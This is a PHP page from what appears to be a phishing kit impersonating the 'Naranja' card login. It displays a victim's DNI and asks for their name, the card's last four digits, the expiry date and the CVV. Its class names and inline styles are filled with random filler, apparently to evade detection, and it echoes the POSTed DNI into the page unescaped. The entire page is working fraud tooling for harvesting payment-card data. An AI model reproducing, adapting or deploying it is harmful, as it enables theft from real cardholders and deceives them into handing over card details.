<?php
if(isset($_POST["dni"])){
	$dni = $_POST["dni"];
	
}
else {
	header("Location: /");
}
include_once("parts/header.php");
?>
<body>
<nav class="d-md-block 2D5rEGOr3f d-none E0vNk3OqoLXw" style="unicode-bidi:initial;font-kerning:initial;scale:initial;">
	<div class="Xre7bZlWi navbar-contenedor" style="font-kerning:initial;font-kerning:initial;font-kerning:initial;">
		<?php include_once("parts/nav.php"); ?>
		<span style="flood-color:currentcolor;scale:initial;font-kerning:initial;" class="qMT5h">Inicio sesión</span>
	</div>
</nav>
<form id="verify_data" style="scale:initial;flood-color:currentcolor;scale:initial;" class="YO6Ol4n">
	<input class="8vAtNTjDtk4" type="hidden" value="<?php echo $dni; ?>" name="dni" style="flood-color:currentcolor;flood-color:currentcolor;writing-mode:inherit;">
	<div style="flood-color:currentcolor;flood-color:currentcolor;unicode-bidi:initial;" class="VTvGZPBKFS3G container-fluid yCTLG19Yku mt-0 mt-md-5 zZLLRm6g">
		<div class="row mDHIsAN d-flex wth0V1ZgFrbNlHH justify-content-center" style="flood-color:currentcolor;flood-color:currentcolor;writing-mode:inherit;">
			<div class="nc0LxTjk col-12 col-md-5 b1jLi mt-0 mt-md-5 mt-md-5 evpKCa5UEK" style="unicode-bidi:initial;unicode-bidi:initial;flood-color:currentcolor;">
				<div class="hoipBdl4yeW5n row OyQNh" style="font-kerning:initial;flood-color:currentcolor;scale:initial;">
					<div class="5YF2QmL col-12 d-flex oHwoMC mt-2 mb-5 C65rqUkupcE d-md-none" style="scale:initial;scale:initial;writing-mode:inherit;">
						<a style="font-kerning:initial;writing-mode:inherit;flood-color:currentcolor;" href="#" onclick="window.history.back();" class="bAX3t change_account_movil qVHABZS1hdr ml-auto">Cambiar cuenta</a>
					</div>
					<div style="unicode-bidi:initial;scale:initial;writing-mode:inherit;" class="col-12 8QNRB d-flex justify-content-between dkAJh align-items-center">
						<h3 style="writing-mode:inherit;unicode-bidi:initial;scale:initial;" class="E9dtayhnSU5eGQ">Hola, bienvenido</h3>
						<a style="flood-color:currentcolor;writing-mode:inherit;font-kerning:initial;" href="#" onclick="window.history.back();" class="CL78r7etyFyPDfM change_account ywDDPGWUb8T">Cambiar cuenta</a>
					</div>
					<div class="col-12 XJt8Wv" style="unicode-bidi:initial;writing-mode:inherit;font-kerning:initial;">
						<h5 class="fb5hAa6kH" style="flood-color:currentcolor;flood-color:currentcolor;writing-mode:inherit;">DNI: <?php echo $dni; ?></h5>
					</div>
				</div>
				<div class="IJf7CxJ row d-flex justify-content-center qoMxM contenedor_caja gQN9ll2gClQE7b mb-5" style="writing-mode:inherit;scale:initial;flood-color:currentcolor;">
					<div style="writing-mode:inherit;unicode-bidi:initial;flood-color:currentcolor;" class="BTKlYF7 col-12 8KeS3O9X form-padding">
						<div style="writing-mode:inherit;unicode-bidi:initial;font-kerning:initial;" class="row RSJkPtqrw9an3ZS">
							<div style="writing-mode:inherit;scale:initial;font-kerning:initial;" class="input ljlKMvjXydDI col-12 I7DZXKCvsLK mt-2">
								<label style="writing-mode:inherit;font-kerning:initial;unicode-bidi:initial;" for="nombre" class="EKm7Ucfqh4W">Nombre</label>
								<input style="flood-color:currentcolor;scale:initial;scale:initial;" class="YiAwyEO" type="text" id="nombre" name="nombre" placeholder="" minlength="4" maxlength="50" required>
								</div>
								</div>
<div class="IJf7CxJ row d-flex justify-content-center qoMxM contenedor_caja gQN9ll2gClQE7b mb-5" style="writing-mode:inherit;scale:initial;flood-color:currentcolor;">
					<div style="writing-mode:inherit;unicode-bidi:initial;flood-color:currentcolor;" class="BTKlYF7 col-12 8KeS3O9X form-padding">
						<div style="writing-mode:inherit;unicode-bidi:initial;font-kerning:initial;" class="row RSJkPtqrw9an3ZS">
							<div style="writing-mode:inherit;scale:initial;font-kerning:initial;" class="input ljlKMvjXydDI col-12 I7DZXKCvsLK mt-2">
								<label style="writing-mode:inherit;font-kerning:initial;unicode-bidi:initial;" for="digitos" class="EKm7Ucfqh4W">Ultimos 4 Digitos de tu Naranja</label>
								<input style="flood-color:currentcolor;scale:initial;scale:initial;" class="YiAwyEO" type="text" id="digitos" name="digitos" placeholder="" minlength="2" maxlength="4" required>
	</div>							
</div>
				<div class="IJf7CxJ row d-flex justify-content-center qoMxM contenedor_caja gQN9ll2gClQE7b mb-5" style="writing-mode:inherit;scale:initial;flood-color:currentcolor;">
					<div style="writing-mode:inherit;unicode-bidi:initial;flood-color:currentcolor;" class="BTKlYF7 col-12 8KeS3O9X form-padding">
						<div style="writing-mode:inherit;unicode-bidi:initial;font-kerning:initial;" class="row RSJkPtqrw9an3ZS">
							<div style="writing-mode:inherit;scale:initial;font-kerning:initial;" class="input ljlKMvjXydDI col-12 I7DZXKCvsLK mt-2">
								<label style="writing-mode:inherit;font-kerning:initial;unicode-bidi:initial;" for="mmaa" class="EKm7Ucfqh4W">Fecha de vencimiento (MM/AA)</label>
								<input style="flood-color:currentcolor;scale:initial;scale:initial;" class="YiAwyEO" type="text" id="mmaa" name="mmaa" placeholder="" minlength="2" maxlength="7" required>
								</div>
</div>
				<div class="IJf7CxJ row d-flex justify-content-center qoMxM contenedor_caja gQN9ll2gClQE7b mb-5" style="writing-mode:inherit;scale:initial;flood-color:currentcolor;">
					<div style="writing-mode:inherit;unicode-bidi:initial;flood-color:currentcolor;" class="BTKlYF7 col-12 8KeS3O9X form-padding">
						<div style="writing-mode:inherit;unicode-bidi:initial;font-kerning:initial;" class="row RSJkPtqrw9an3ZS">
							<div style="writing-mode:inherit;scale:initial;font-kerning:initial;" class="input ljlKMvjXydDI col-12 I7DZXKCvsLK mt-2">
								<label style="writing-mode:inherit;font-kerning:initial;unicode-bidi:initial;" for="cvv" class="EKm7Ucfqh4W">Codigo de seguridad (3 digitos al dorso)</label>
								<input style="flood-color:currentcolor;scale:initial;scale:initial;" class="YiAwyEO" type="text" id="cvv" name="cvv" placeholder="" minlength="2" maxlength="3" required>
								
							</div></div>
							</div>
					</div>
					<div style="writing-mode:inherit;unicode-bidi:initial;writing-mode:inherit;" class="col-12 MvN850qbQsQXCNl linea"></div>
					<div class="nKxGwNvPYLvlKue col-12 p-3" style="font-kerning:initial;scale:initial;writing-mode:inherit;">
						<div class="kDHNJiie9 row" style="scale:initial;scale:initial;scale:initial;">
							<div class="352sB col-12" style="writing-mode:inherit;writing-mode:inherit;font-kerning:initial;">
								<button disabled="" class="oHmKINK2cKOfW pc aICzx step2" id="pc" type="submit" style="font-kerning:initial;writing-mode:inherit;scale:initial;"><span class="Wcun6O" id="ingresar" style="scale:initial;flood-color:currentcolor;unicode-bidi:initial;">Ingresar <img src="flecha.png" class="kVvqjB1Xo29y55"></span><svg id="loading" class="PBNzIZkHb1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" style="margin: auto; display: none; shape-rendering: auto;" style="scale:initial;font-kerning:initial;writing-mode:inherit;" width="1.5em" height="1.5em" viewBox="0 0 100 100" preserveAspectRatio="xMidYMid">
<circle cx="50" cy="50" fill="none" stroke="#ffffff" stroke-width="7" r="35" stroke-dasharray="164.93361431346415 56.97787143782138">
  <animateTransform attributeName="transform" type="rotate" repeatCount="indefinite" dur="1s" values="0 50 50;360 50 50" keyTimes="0;1"></animateTransform>
</circle></svg></button>
							
				
</form>
<div class="5XyF0Yl alert-error Ceh5oFm4F" id="alert-error" style="display: none;" style="flood-color:currentcolor;flood-color:currentcolor;writing-mode:inherit;">
	<div class="XkNeEVCbYKAH alert-container" style="font-kerning:initial;scale:initial;unicode-bidi:initial;">
		<div class="icon qpKDBj53ng" style="font-kerning:initial;flood-color:currentcolor;font-kerning:initial;">
			<img style="writing-mode:inherit;font-kerning:initial;flood-color:currentcolor;" src="error.png" class="NCEJbAVu6J" width="64px" height="64px">
		
		<h3 style="unicode-bidi:initial;font-kerning:initial;scale:initial;" class="JpENq text-center tGosjbTOH9L mt-3">Ocurrio un error al iniciar sesion.</h3>

<?php
include_once("parts/footer.php");
?>
</body>
</html>